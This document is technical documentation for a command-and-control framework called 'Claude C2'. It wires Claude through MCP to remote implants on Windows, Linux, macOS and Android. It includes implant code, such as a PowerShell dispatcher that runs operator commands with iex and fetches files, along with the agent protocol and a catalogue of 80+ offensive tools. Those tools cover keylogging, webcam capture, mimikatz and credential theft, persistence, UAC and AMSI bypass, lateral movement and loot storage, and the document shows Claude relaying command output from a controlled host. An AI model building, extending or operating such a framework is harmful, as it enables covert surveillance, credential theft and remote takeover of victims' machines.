# Claude C2 - Command Flow Technical Documentation

> Comprehensive technical documentation for the MCP Remote Agent C2 Framework

## Table of Contents
1. [Architecture Overview](#architecture-overview)
2. [System Components](#system-components)
3. [Communication Protocol](#communication-protocol)
4. [Command Flow Pipeline](#command-flow-pipeline)
5. [Agent Implementation](#agent-implementation)
6. [Authentication & Security](#authentication--security)
7. [API Reference](#api-reference)
8. [Data Structures](#data-structures)
9. [Code Reference Map](#code-reference-map)

---

## Architecture Overview

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           OPERATOR LAYER                                 │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐       │
│  │   Claude.ai      │  │   Claude Code    │  │   MCP Client     │       │
│  │   (Web UI)       │  │   (CLI)          │  │   (Custom)       │       │
│  └────────┬─────────┘  └────────┬─────────┘  └────────┬─────────┘       │
└───────────┼─────────────────────┼─────────────────────┼─────────────────┘
            │                     │                     │
            └─────────────────────┼─────────────────────┘
                                  │ MCP Protocol (SSE/JSON-RPC 2.0)
                                  │ HTTPS + OAuth/API Key Auth
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                         C2 SERVER (Node.js)                             │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                      Express.js (Port 3100)                     │    │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │    │
│  │  │ OAuth 2.0    │  │ MCP Handler  │  │ Agent Payload Server │  │    │
│  │  │ /oauth/*     │  │ /mcp/sse     │  │ /agent/{platform}    │  │    │
│  │  └──────────────┘  └──────────────┘  └──────────────────────┘  │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                  Core Managers                                  │    │
│  │  ┌──────────────────┐  ┌────────────────────────────────────┐  │    │
│  │  │ SecureAuthManager│  │ ClientManager                       │  │    │
│  │  │ - API Key Hash   │  │ - clients: Map<clientId, Client>   │  │    │
│  │  │ - Rate Limiting  │  │ - pendingCommands: Map<cmdId, P>   │  │    │
│  │  │ - Lockout Logic  │  │ - commandHistory: Map<clientId, H> │  │    │
│  │  └──────────────────┘  └────────────────────────────────────┘  │    │
│  └────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │                  WebSocket Server (Port 3102)                   │    │
│  │  - Persistent agent connections                                 │    │
│  │  - Bidirectional command/response routing                       │    │
│  │  - 15-second heartbeat ping/pong                                │    │
│  └────────────────────────────────────────────────────────────────┘    │
└────────────────────────────────────────────────────────────────────────┘
                                  │
                                  │ WebSocket Secure (WSS)
                                  │ JSON Messages
                                  ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                           AGENT LAYER                                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌────────────┐  │
│  │   Windows    │  │    Linux     │  │    macOS     │  │  Android   │  │
│  │  PowerShell  │  │  Bash/Python │  │    Bash      │  │  Termux    │  │
│  │ windows.ps1  │  │  linux.sh    │  │  macos.sh    │  │ termux.sh  │  │
│  └──────────────┘  └──────────────┘  └──────────────┘  └────────────┘  │
│                                                                         │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │              Cross-Platform Python Agent (agent.py)              │  │
│  └──────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
```

### Directory Structure

```
/home/iozac/mcp-remote-agent/
├── src/
│   └── server.js           # Main MCP server (2,190+ lines)
├── clients/
│   ├── agent.js            # Node.js reference client
│   └── package.json
├── agents/
│   ├── windows.ps1         # Windows PowerShell agent (244 lines)
│   ├── linux.sh            # Linux Bash/Python agent (250+ lines)
│   ├── macos.sh            # macOS agent (200+ lines)
│   ├── termux.sh           # Android Termux agent (180+ lines)
│   ├── agent.py            # Cross-platform Python agent (350+ lines)
│   └── index.html          # Agent download page
├── docs/
│   ├── INTEGRATIONS.md     # Integration guide
│   ├── ANDROID-TERMUX.md   # Termux setup guide
│   └── COMMAND-FLOW.md     # This document
├── config/
│   └── .env                # Configuration template
├── .env                    # Active configuration
├── package.json            # Node.js dependencies
├── README.md               # Main documentation
└── setup.sh, install.sh    # Deployment scripts
```

### Technology Stack

| Component | Technology | Version |
|-----------|------------|---------|
| Runtime | Node.js | ES Modules |
| Web Framework | Express.js | 5.2.1 |
| WebSocket | ws | 8.18.3 |
| Security | helmet | 8.1.0 |
| Rate Limiting | express-rate-limit | 8.2.1 |
| Encryption | crypto-js | 4.2.0 |
| JWT | jsonwebtoken | 9.0.3 |
| CORS | cors | 2.8.5 |

---

## System Components

### 1. SecureAuthManager

**Location**: `src/server.js:30-210`

Handles API key authentication with brute-force protection.

```javascript
class SecureAuthManager {
  constructor() {
    this.failedAttempts = new Map();     // IP -> failure tracking
    this.lockedIPs = new Map();          // IP -> lockout timestamp

    // Config
    this.maxAttempts = 5;                // Per minute
    this.baseLockoutMs = 30000;          // 30 seconds
    this.maxLockoutMs = 1800000;         // 30 minutes
  }
}
```

**Key Methods**:

| Method | Line | Description |
|--------|------|-------------|
| `generateKey()` | 51-56 | Generate 256-bit API key + SHA-256 hash |
| `hashKey(key)` | 58-62 | SHA-256 hash of plaintext key |
| `safeCompare(a, b)` | 64-74 | Timing-safe comparison |
| `isLocked(ip)` | 86-103 | Check lockout status with exponential backoff |
| `recordFailure(ip)` | 105-133 | Track failed auth attempts |
| `recordSuccess(ip)` | 135-141 | Reset failure counter |
| `validateApiKey(req)` | 165-209 | Full validation with rate limiting |

**Security Features**:
- Never stores plaintext API keys
- Timing-safe hash comparison prevents timing attacks
- Exponential backoff: 30s → 60s → 2m → 4m → ... → 30m max
- Auto-cleanup of stale entries every 5 minutes

### 2. ClientManager

**Location**: `src/server.js:264-326`

Manages all connected remote agents.

```javascript
class ClientManager {
  constructor() {
    this.clients = new Map();           // clientId -> Client
    this.pendingCommands = new Map();   // commandId -> Promise handlers
    this.commandHistory = new Map();    // clientId -> command log
  }
}
```

**Key Methods**:

| Method | Line | Description |
|--------|------|-------------|
| `register(clientId, ws, info)` | 271 | Register new agent connection |
| `getActiveClients()` | 279 | List all online agents |
| `sendCommand(clientId, cmd, args, timeout)` | 289-305 | Queue command to agent |
| `handleCommandResponse(cmdId, result)` | 307-314 | Process agent response |
| `addToHistory(clientId, entry)` | 316 | Audit log entry |
| `getHistory(clientId, limit)` | 323 | Retrieve command history |

### 3. MCP Handler

**Location**: `src/server.js:457-1876`

Implements the Model Context Protocol (MCP) for Claude integration.

**Supported Methods**:
- `initialize` - Protocol handshake
- `tools/list` - Return available tools
- `tools/call` - Execute a tool

**Tool Categories** (80+ tools):

| Category | Tools | Lines |
|----------|-------|-------|
| Client Management | `list_clients`, `client_info` | 664-699 |
| Shell Execution | `shell`, `powershell` | 704-730 |
| Reconnaissance | `sysinfo`, `netinfo`, `pslist`, `services`, etc. | 732-795 |
| File Operations | `ls`, `cat`, `write`, `download`, `upload`, `rm`, `mkdir` | 807-900 |
| Surveillance | `screenshot`, `webcam`, `keylog_*`, `clipboard` | 797-838 |
| Credential Access | `hashdump`, `mimikatz`, `browser_creds`, `wifi_passwords` | 839-880 |
| Persistence | `persist_*` (7 methods) | 882-940 |
| Privilege Escalation | `privesc_check`, `getsystem`, `bypassuac`, `runas` | 942-965 |
| Lateral Movement | `portscan`, `netscan`, `psexec`, `wmiexec`, `winrm` | 1080-1150 |
| Defense Evasion | `amsi_bypass`, `etw_patch`, `defender_exclude` | 1152-1200 |
| Server Control | `server_shell`, `server_file_*`, `mcp_*` | 1790-1876 |

### 4. WebSocket Server

**Location**: `src/server.js:2111-2174`

Maintains persistent connections with deployed agents.

```javascript
const wss = new WebSocketServer({ port: config.wsPort });

wss.on('connection', (ws, req) => {
  // Heartbeat interval
  const pingInterval = setInterval(() => {
    ws.send(JSON.stringify({ type: 'ping' }));
  }, 15000);

  ws.on('message', (data) => {
    const msg = JSON.parse(data.toString());
    // Handle message types: register, pong, command_response
  });
});
```

**Message Types**:

| Type | Direction | Purpose |
|------|-----------|---------|
| `register` | Agent → Server | Initial registration |
| `registered` | Server → Agent | Registration confirmation |
| `ping` | Server → Agent | Heartbeat |
| `pong` | Agent → Server | Heartbeat response |
| `command` | Server → Agent | Execute command |
| `command_response` | Agent → Server | Command result |

---

## Communication Protocol

### MCP Protocol (Operator ↔ Server)

**Transport**: Server-Sent Events (SSE) over HTTPS

**Endpoint**: `GET/POST /mcp/sse`

#### SSE Connection Establishment

```
GET /mcp/sse HTTP/1.1
Host: c2-server.example.com
X-API-Key: <api-key>
Accept: text/event-stream

HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

event: endpoint
data: https://c2-server.example.com/mcp/sse?sessionId=abc123

: keepalive
```

#### JSON-RPC 2.0 Request/Response

**Request**:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "shell",
    "arguments": {
      "client_id": "LAPTOP01",
      "cmd": "whoami"
    }
  }
}
```

**Response**:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "{\"success\": true, \"stdout\": \"admin\", \"exitCode\": 0}"
      }
    ]
  }
}
```

**Error Response**:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32000,
    "message": "Client LAPTOP01 is not connected"
  }
}
```

### WebSocket Protocol (Server ↔ Agent)

**Transport**: WebSocket Secure (WSS) on port 3102

#### Agent Registration

```json
// Agent → Server
{
  "type": "register",
  "clientId": "LAPTOP01",
  "authSecret": "<shared-secret>",
  "hostname": "LAPTOP01",
  "platform": "Windows",
  "arch": "AMD64",
  "username": "admin"
}

// Server → Agent
{
  "type": "registered",
  "clientId": "LAPTOP01",
  "message": "Successfully registered with server"
}
```

#### Command Execution

```json
// Server → Agent
{
  "type": "command",
  "commandId": "550e8400-e29b-41d4-a716-446655440000",
  "command": "shell",
  "args": {
    "cmd": "whoami"
  },
  "timestamp": "2024-12-05T10:30:00.000Z"
}

// Agent → Server
{
  "type": "command_response",
  "commandId": "550e8400-e29b-41d4-a716-446655440000",
  "result": {
    "success": true,
    "stdout": "admin",
    "stderr": "",
    "exitCode": 0
  }
}
```

#### Heartbeat

```json
// Server → Agent (every 15 seconds)
{ "type": "ping" }

// Agent → Server
{ "type": "pong" }
```

---

## Command Flow Pipeline

### Complete Execution Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 1: OPERATOR REQUEST                                                  │
│                                                                          │
│ User (Claude.ai):  "Execute 'whoami' on LAPTOP01"                        │
│                                                                          │
│ Claude AI translates to MCP tool call                                    │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 2: MCP REQUEST                                                       │
│                                                                          │
│ POST /mcp/sse HTTP/1.1                                                   │
│ X-API-Key: <hashed-api-key>                                              │
│                                                                          │
│ {                                                                        │
│   "jsonrpc": "2.0",                                                      │
│   "id": 1,                                                               │
│   "method": "tools/call",                                                │
│   "params": {                                                            │
│     "name": "shell",                                                     │
│     "arguments": { "client_id": "LAPTOP01", "cmd": "whoami" }           │
│   }                                                                      │
│ }                                                                        │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 3: AUTHENTICATION (src/server.js:165-209)                           │
│                                                                          │
│ apiKeyAuthMiddleware:                                                    │
│ ├─ Extract IP from request                                              │
│ ├─ Check lockout status (exponential backoff)                           │
│ ├─ Extract X-API-Key header                                             │
│ ├─ Hash key: SHA-256(apiKey)                                            │
│ ├─ Compare with config.apiKeyHash (timing-safe)                         │
│ ├─ On failure: recordFailure(ip), return 401                            │
│ └─ On success: recordSuccess(ip), continue                              │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 4: MCP HANDLER (src/server.js:457-620)                              │
│                                                                          │
│ POST /mcp/sse handler:                                                   │
│ ├─ Parse JSON-RPC request                                               │
│ ├─ Route by method: "tools/call"                                        │
│ ├─ Extract tool name: "shell"                                           │
│ ├─ Extract arguments: { client_id, cmd }                                │
│ └─ Dispatch to tool handler                                             │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 5: TOOL HANDLER - shell (src/server.js:704-730)                     │
│                                                                          │
│ Shell tool handler:                                                      │
│ ├─ getClientId():                                                        │
│ │   ├─ If args.client_id provided → use it                              │
│ │   ├─ If 1 client connected → auto-select                              │
│ │   └─ If 0 or multiple → error                                         │
│ ├─ sendCmd('shell', { cmd: 'whoami' })                                  │
│ └─ Await response Promise                                               │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 6: COMMAND QUEUEING (src/server.js:289-305)                         │
│                                                                          │
│ ClientManager.sendCommand():                                             │
│ ├─ Lookup client in this.clients Map                                    │
│ ├─ Verify WebSocket is OPEN                                             │
│ ├─ Generate commandId: uuidv4()                                         │
│ ├─ Create message object:                                               │
│ │   {                                                                    │
│ │     type: 'command',                                                   │
│ │     commandId: '550e8400-...',                                        │
│ │     command: 'shell',                                                  │
│ │     args: { cmd: 'whoami' },                                          │
│ │     timestamp: '2024-12-05T10:30:00Z'                                 │
│ │   }                                                                    │
│ ├─ Set timeout (default 30s)                                            │
│ ├─ Store Promise handlers in pendingCommands                            │
│ └─ Send JSON via WebSocket                                              │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 │ WebSocket Message
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 7: AGENT EXECUTION (agents/windows.ps1:48-126)                      │
│                                                                          │
│ PowerShell Agent:                                                        │
│ ├─ Receive WebSocket message                                            │
│ ├─ Parse JSON: $msg = ConvertFrom-Json $data                            │
│ ├─ Route by type: "command"                                             │
│ ├─ Route by command: "shell"                                            │
│ ├─ Execute: $output = iex $msg.args.cmd                                 │
│ ├─ Capture stdout, stderr, exitCode                                     │
│ └─ Build response:                                                       │
│     {                                                                    │
│       type: 'command_response',                                          │
│       commandId: '550e8400-...',                                        │
│       result: {                                                          │
│         success: true,                                                   │
│         stdout: 'admin',                                                 │
│         stderr: '',                                                      │
│         exitCode: 0                                                      │
│       }                                                                  │
│     }                                                                    │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 │ WebSocket Message
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 8: RESPONSE HANDLING (src/server.js:307-314)                        │
│                                                                          │
│ WebSocket message handler:                                               │
│ ├─ Parse JSON: msg.type === 'command_response'                          │
│ ├─ ClientManager.handleCommandResponse():                               │
│ │   ├─ Lookup commandId in pendingCommands                              │
│ │   ├─ clearTimeout()                                                   │
│ │   ├─ Delete from pendingCommands                                      │
│ │   ├─ Resolve Promise with result                                      │
│ │   └─ addToHistory(clientId, entry)                                    │
│ └─ sendCmd() Promise resolves                                           │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 9: MCP RESPONSE (src/server.js:704-730)                             │
│                                                                          │
│ Format MCP result:                                                       │
│ {                                                                        │
│   "jsonrpc": "2.0",                                                      │
│   "id": 1,                                                               │
│   "result": {                                                            │
│     "content": [{                                                        │
│       "type": "text",                                                    │
│       "text": "{\"success\":true,\"stdout\":\"admin\",...}"             │
│     }]                                                                   │
│   }                                                                      │
│ }                                                                        │
│                                                                          │
│ Send via SSE:                                                            │
│ event: message                                                           │
│ data: {"jsonrpc":"2.0","id":1,"result":{...}}                           │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ STEP 10: OPERATOR RESPONSE                                               │
│                                                                          │
│ Claude AI receives result and formats for user:                          │
│                                                                          │
│ "The command executed successfully on LAPTOP01.                          │
│  Output: admin                                                           │
│  The system is running as the 'admin' user."                             │
└──────────────────────────────────────────────────────────────────────────┘
```

### Timeout and Error Handling

```javascript
// Command timeout (src/server.js:289-305)
async sendCommand(clientId, command, args = {}, timeout = 30000) {
  return new Promise((resolve, reject) => {
    const timeoutId = setTimeout(() => {
      this.pendingCommands.delete(commandId);
      reject(new Error(`Command timeout after ${timeout}ms`));
    }, timeout);

    this.pendingCommands.set(commandId, { resolve, reject, timeoutId });
    client.ws.send(JSON.stringify(message));
  });
}
```

**Default Timeouts by Command**:

| Command | Timeout | Reason |
|---------|---------|--------|
| shell, powershell | 30s | Standard execution |
| screenshot | 60s | Screen capture + base64 encoding |
| mimikatz | 120s | Complex memory operations |
| hashdump | 120s | Registry extraction |
| file operations | 30s | Standard I/O |

---

## Agent Implementation

### Windows PowerShell Agent

**Location**: `agents/windows.ps1`

```powershell
# Command dispatcher (Lines 48-126)
function Run($c, $a) {
    switch ($c) {
        "shell"       { iex $a.cmd }
        "powershell"  { iex $a.script }
        "file_read"   { Get-Content $a.path -Raw }
        "file_write"  { Set-Content $a.path $a.content }
        "file_list"   { Get-ChildItem $a.path | Select Name, Length, LastWriteTime }
        "system_info" { Get-ComputerInfo | ConvertTo-Json }
        "process_list"{ Get-Process | Select Id, ProcessName, CPU, WorkingSet }
        "screenshot"  { Take-Screenshot }
        "download"    { Invoke-WebRequest $a.url -OutFile $a.path }
        "status"      { @{ alive = $true; time = Get-Date } }
        default       { @{ error = "Unknown command: $c" } }
    }
}
```

**Supported Commands**:

| Command | Arguments | Description |
|---------|-----------|-------------|
| `shell` | `cmd: string` | Execute cmd.exe command |
| `powershell` | `script: string` | Execute PowerShell script |
| `file_read` | `path: string` | Read file contents |
| `file_write` | `path, content: string` | Write to file |
| `file_list` | `path: string` | List directory |
| `system_info` | - | Get OS/hardware info |
| `process_list` | - | List running processes |
| `screenshot` | - | Capture screen (base64) |
| `download` | `url, path: string` | Download file from URL |
| `status` | - | Health check |

### Linux Bash/Python Agent

**Location**: `agents/linux.sh`

**Architecture**:
- Auto-detects websocat or Python3
- Falls back to embedded Python client
- Cross-compatible with most Linux distributions

```bash
# Detection logic (Lines 1-20)
if command -v websocat &> /dev/null; then
    # Use websocat for WebSocket
    use_websocat
elif command -v python3 &> /dev/null; then
    # Use embedded Python client
    python3 - <<'PYTHON'
    # Embedded Python WebSocket client
    PYTHON
fi
```

### Cross-Platform Python Agent

**Location**: `agents/agent.py`

```python
class MCPAgent:
    def __init__(self, server, secret, client_id):
        self.server = server
        self.secret = secret
        self.client_id = client_id

    def get_system_info(self):
        return {
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'arch': platform.machine(),
            'username': getpass.getuser(),
            'python': platform.python_version()
        }

    async def run_command(self, cmd, args):
        handlers = {
            'shell': self.exec_shell,
            'file_read': self.read_file,
            'file_write': self.write_file,
            'screenshot': self.take_screenshot,
            # ... more handlers
        }
        return await handlers.get(cmd, self.unknown)(args)
```

**Platform Detection**:
```python
PLATFORM = platform.system()
IS_WINDOWS = PLATFORM == "Windows"
IS_MACOS = PLATFORM == "Darwin"
IS_LINUX = PLATFORM == "Linux"
IS_TERMUX = os.path.exists('/data/data/com.termux')
```

---

## Authentication & Security

### API Key Authentication

**Generation** (src/server.js:51-56):
```javascript
static generateKey() {
  // 256-bit random key
  const key = randomBytes(32).toString('base64url');
  // SHA-256 hash for storage
  const hash = createHash('sha256').update(key).digest('hex');
  return { key, hash };
}
```

**Validation Flow** (src/server.js:165-209):
```
Request → Extract IP → Check Lockout → Extract X-API-Key
    ↓
Hash Key: SHA-256(apiKey)
    ↓
Timing-Safe Compare with config.apiKeyHash
    ↓
Success → recordSuccess(ip) → Continue
Failure → recordFailure(ip) → Check Threshold → 401/423 Response
```

**Rate Limiting**:

| Attempts | Lockout Duration |
|----------|------------------|
| 1-5 | None |
| 6 | 30 seconds |
| 7 | 60 seconds |
| 8 | 2 minutes |
| 9 | 4 minutes |
| 10+ | Doubles each time (max 30 min) |

### Agent Authentication

**Shared Secret**:
- Configured in `.env` as `CLIENT_AUTH_SECRET`
- Embedded in agent payloads at download time
- Validated on WebSocket registration

```javascript
// Server validation (src/server.js:2124-2128)
if (msg.authSecret !== config.clientAuthSecret) {
  ws.close(4001, 'Invalid auth secret');
  return;
}
```

### Encryption

**In Transit**:
- HTTPS/TLS for all HTTP traffic
- WSS (WebSocket Secure) for agent connections
- Valid SSL certificate required (Let's Encrypt recommended)

**At Rest**:
- API keys stored as SHA-256 hashes only
- No plaintext credential storage

**Binary Data**:
- Screenshots encoded as base64
- Files transferred as base64 for JSON compatibility

---

## API Reference

### HTTP Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| GET | `/health` | None | Server health check |
| GET | `/mcp/sse` | API Key | SSE connection |
| POST | `/mcp/sse` | API Key | MCP JSON-RPC |
| GET | `/.well-known/oauth-authorization-server` | None | OAuth discovery |
| GET | `/oauth/authorize` | None | OAuth authorization |
| POST | `/oauth/token` | None | Token exchange |
| GET | `/agent/{platform}` | None | Download agent |
| GET | `/agents` | None | Agent download page |
| GET | `/test/clients` | None | List clients (dev) |
| POST | `/test/command` | None | Send command (dev) |

### MCP Tools Quick Reference

**Client Management**:
- `list_clients` - List connected agents
- `client_info { client_id }` - Get agent details

**Execution**:
- `shell { client_id?, cmd }` - Shell command
- `powershell { client_id?, script }` - PowerShell script

**File Operations**:
- `ls { client_id?, path }` - List directory
- `cat { client_id?, path }` - Read file
- `write { client_id?, path, content }` - Write file
- `download { client_id?, url, path }` - Download URL
- `upload { client_id?, path }` - Upload file to C2

**Reconnaissance**:
- `sysinfo { client_id? }` - System information
- `netinfo { client_id? }` - Network configuration
- `pslist { client_id? }` - Process list
- `services { client_id? }` - Windows services

**Surveillance**:
- `screenshot { client_id? }` - Capture screen
- `keylog_start { client_id? }` - Start keylogger
- `keylog_dump { client_id? }` - Get keylog data
- `clipboard { client_id? }` - Get clipboard

---

## Data Structures

### Client Object

```typescript
interface Client {
  ws: WebSocket;
  info: {
    hostname: string;
    platform: "Windows" | "Linux" | "Darwin";
    arch: string;
    username: string;
    ip: string;
    registeredAt: string;  // ISO8601
  };
  lastSeen: Date;
  status: "online" | "offline";
}
```

### Command Message

```typescript
interface CommandMessage {
  type: "command";
  commandId: string;      // UUID v4
  command: string;        // Tool name
  args: Record<string, any>;
  timestamp: string;      // ISO8601
}
```

### Command Response

```typescript
interface CommandResponse {
  type: "command_response";
  commandId: string;
  result: {
    success: boolean;
    stdout?: string;
    stderr?: string;
    exitCode?: number;
    error?: string;
    b64?: string;         // For binary data
    [key: string]: any;   // Command-specific fields
  };
}
```

### MCP Tool Definition

```typescript
interface MCPTool {
  name: string;
  description: string;
  inputSchema: {
    type: "object";
    properties: Record<string, {
      type: string;
      description: string;
    }>;
    required?: string[];
  };
}
```

---

## Code Reference Map

### Key Files and Line Ranges

| Component | File | Lines | Description |
|-----------|------|-------|-------------|
| Main Server | `src/server.js` | 1-2190 | All server code |
| SecureAuthManager | `src/server.js` | 30-210 | Auth + rate limiting |
| ClientManager | `src/server.js` | 264-326 | Agent management |
| OAuth Endpoints | `src/server.js` | 350-422 | OAuth 2.0 flow |
| MCP SSE Handler | `src/server.js` | 424-476 | SSE setup |
| Tool Definitions | `src/server.js` | 492-620 | 80+ tool schemas |
| Tool Handlers | `src/server.js` | 628-1876 | Execution logic |
| WebSocket Server | `src/server.js` | 2111-2174 | Agent connections |
| Windows Agent | `agents/windows.ps1` | 1-244 | PowerShell implant |
| Linux Agent | `agents/linux.sh` | 1-250 | Bash/Python implant |
| Python Agent | `agents/agent.py` | 1-350 | Cross-platform |

### Critical Functions

| Function | File:Line | Purpose |
|----------|-----------|---------|
| `validateApiKey` | server.js:165 | API key validation |
| `sendCommand` | server.js:289 | Command dispatch |
| `handleCommandResponse` | server.js:307 | Response processing |
| `getClientId` | server.js:628 | Smart client selection |
| `saveLoot` | server.js:654 | Credential storage |

---

## Appendix: Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `PORT` | No | HTTP port (default: 3100) |
| `WS_PORT` | No | WebSocket port (default: 3102) |
| `API_KEY_HASH` | Yes | SHA-256 hash of API key |
| `CLIENT_AUTH_SECRET` | Yes | Agent authentication secret |
| `JWT_SECRET` | No | JWT signing key (auto-generated) |
| `OAUTH_CLIENT_ID` | No | OAuth client ID (auto-generated) |
| `OAUTH_CLIENT_SECRET` | No | OAuth client secret (auto-generated) |

---

*Document generated from claude-c2 v2.0.0*
*Last updated: 2024-12-05*
